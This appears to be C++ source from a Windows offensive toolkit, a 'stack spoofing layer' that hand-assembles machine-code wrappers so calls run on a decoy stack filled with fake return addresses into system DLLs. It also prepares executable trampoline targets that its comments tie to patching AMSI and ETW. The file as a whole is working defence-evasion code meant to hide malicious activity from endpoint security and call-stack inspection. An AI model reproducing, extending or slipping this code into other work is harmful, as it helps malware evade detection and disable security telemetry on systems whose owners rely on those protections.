// Stack spoofing layer - implementation
// Wrapper stub machine code (up to 12 args):
//   mov [rip+slot], rsp              save real stack pointer (slot lives in a
//                                    separate RW page so the code page is RX)
//   mov r10, <switch_top>            decoy stack top minus arg headroom
//   mov r11, [rsp+40+8i]             copy caller's tail args
//   mov [r10+32+8i], r11             onto the decoy stack
//   mov rsp, r10                     switch stacks
//   mov r11, <target>                call target (regs rcx..r9 already set)
//   call r11
//   mov rsp, [rip+slot]              restore real stack
//   ret
#include "spoof.h"
#include <cstring>

static const DWORD WRAPPER_STRIDE = 128;
static const DWORD DECOY_STACK_SIZE = 0x4000;
static const DWORD ARG_HEADROOM = 128;
static const DWORD PATCH_STRIDE = 16;

static PVOID g_code_page = nullptr;   // wrapper code (RX after finalize)
static PVOID g_slot_page = nullptr;   // per-wrapper RSP save slots (RW)
static PVOID g_patch_page = nullptr;  // trampoline targets for AMSI/ETW (RX after finalize)
static DWORD g_off = 0;
static DWORD g_patch_off = 0;
static PVOID g_decoy_top = nullptr;

namespace spoof {

bool init() {
    if (g_code_page) return true;

    BYTE* decoy = (BYTE*)VirtualAlloc(nullptr, DECOY_STACK_SIZE,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decoy) return false;

    // realistic fill: scattered return addresses from several legit modules,
    // interleaved with heap-like pointers - no cyclic pattern
    HMODULE mods[4] = {0};
    mods[0] = GetModuleHandleA("ntdll.dll");
    mods[1] = GetModuleHandleA("KERNELBASE.dll");
    mods[2] = GetModuleHandleA("WS2_32.dll");
    mods[3] = GetModuleHandleA("bcrypt.dll");
    for (int i = 0; i < 4; i++)
        if (!mods[i]) mods[i] = (HMODULE)((BYTE*)mods[0] + 0x1000 * (i + 1));

    uintptr_t seed = (uintptr_t)decoy ^ GetTickCount();
    auto rnd = [&seed]() { seed = seed * 6364136223846793005ULL + 1442695040888963407ULL; return (uintptr_t)(seed >> 33); };

    BYTE* base = decoy;
    uintptr_t* q = (uintptr_t*)base;
    size_t nq = DECOY_STACK_SIZE / 8;
    for (size_t i = 0; i < nq; i++) {
        if ((rnd() & 7) < 6) {
            // return address into a legit module, at a plausible offset
            uintptr_t m = (uintptr_t)mods[rnd() % 4];
            q[i] = m + (rnd() % 0x800);
        } else {
            // heap-like pointer
            q[i] = (rnd() & 0x7FFFFFFFFFFFULL) + 0x100000;
        }
    }

    uintptr_t top = ((uintptr_t)decoy + DECOY_STACK_SIZE) & ~(uintptr_t)15;
    g_decoy_top = (PVOID)top;

    g_code_page = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    g_slot_page = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    g_patch_page = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    return g_code_page && g_slot_page && g_patch_page;
}

PVOID build_wrapper(PVOID target) {
    if (!g_code_page || g_off + WRAPPER_STRIDE > 0x1000) return nullptr;

    BYTE* p = (BYTE*)g_code_page + g_off;
    BYTE* slot = (BYTE*)g_slot_page + g_off;
    DWORD disp1 = (DWORD)(slot - (p + 7));
    DWORD disp2 = (DWORD)(slot - (p + 112));

    uintptr_t switch_top = (uintptr_t)g_decoy_top - ARG_HEADROOM;

    BYTE code[113] = {0};
    code[0] = 0x48; code[1] = 0x89; code[2] = 0x25;             // mov [rip+disp], rsp
    *(DWORD*)(code + 3) = disp1;
    code[7] = 0x49; code[8] = 0xBA;                             // mov r10, imm64
    *(uintptr_t*)(code + 9) = switch_top;
    DWORD off = 17;
    for (int i = 0; i < 8; i++) {                               // copy 8 tail args
        code[off + 0] = 0x4C; code[off + 1] = 0x8B;             // mov r11, [rsp+disp8]
        code[off + 2] = 0x5C; code[off + 3] = 0x24;
        code[off + 4] = (BYTE)(40 + i * 8);
        code[off + 5] = 0x4D; code[off + 6] = 0x89;             // mov [r10+disp8], r11
        code[off + 7] = 0x5A;
        code[off + 8] = (BYTE)(32 + i * 8);
        off += 9;
    }
    code[off] = 0x4C; code[off + 1] = 0x89; code[off + 2] = 0xD4; // mov rsp, r10
    off += 3;
    code[off] = 0x49; code[off + 1] = 0xBB;                     // mov r11, imm64
    *(uintptr_t*)(code + off + 2) = (uintptr_t)target;
    off += 10;
    code[off] = 0x41; code[off + 1] = 0xFF; code[off + 2] = 0xD3; // call r11
    off += 3;
    code[off] = 0x48; code[off + 1] = 0x8B; code[off + 2] = 0x25; // mov rsp, [rip+disp]
    *(DWORD*)(code + off + 3) = disp2;
    off += 7;
    code[off] = 0xC3;                                           // ret

    memcpy(p, code, sizeof(code));
    g_off += WRAPPER_STRIDE;
    return p;
}

PVOID build_patch_target(const BYTE* code, size_t n) {
    if (!g_patch_page || n > PATCH_STRIDE || g_patch_off + PATCH_STRIDE > 0x1000) return nullptr;
    DWORD old = 0;
    VirtualProtect(g_patch_page, 0x1000, PAGE_READWRITE, &old);
    BYTE* p = (BYTE*)g_patch_page + g_patch_off;
    memcpy(p, code, n);
    VirtualProtect(g_patch_page, 0x1000, PAGE_EXECUTE_READ, &old);
    FlushInstructionCache(GetCurrentProcess(), p, n);
    g_patch_off += PATCH_STRIDE;
    return p;
}

bool finalize() {
    if (!g_code_page) return false;
    DWORD old = 0;
    VirtualProtect(g_code_page, 0x1000, PAGE_EXECUTE_READ, &old);
    VirtualProtect(g_patch_page, 0x1000, PAGE_EXECUTE_READ, &old);
    return true;
}

} // namespace spoof
